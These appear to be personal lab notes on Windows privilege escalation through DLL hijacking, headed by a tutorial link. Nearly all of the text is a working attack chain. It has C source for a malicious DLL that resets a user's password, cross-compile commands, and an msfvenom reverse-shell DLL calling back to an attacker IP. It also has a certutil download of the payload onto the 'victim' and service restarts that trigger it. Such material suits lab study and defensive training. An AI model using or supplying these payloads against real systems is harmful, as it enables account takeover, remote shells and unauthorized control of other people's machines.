<https://steflan-security.com/windows-privilege-escalation-dll-hijacking/>
```
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net user jack Password11");
        ExitProcess(0);
    }
    return TRUE;
}

Super basic example of a c file we start off with. Here we basically just change the password of jack. 

x86_64-w64-mingw32-gcc hijackme.c -shared -o hijackme.dll (here we're cross compiling our c program from kali to a dll file we'll be using on the windows victim machine)


(prob easier alternative) reverse tcp using msfvenom:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.3.155 LPORT=9001 -f dll > hijacked.dll


now on victim:
got to Temp directory or any other more subtle place where you can get files uploaded to

powershell
certutil -urlcache -split -f "http://10.9.3.155/hijacked.dll C:\temp\hijacked.dll

sc query dllsvc
sc stop dllsvc
sc start dllsvc
 
 whoami
 
 :)
```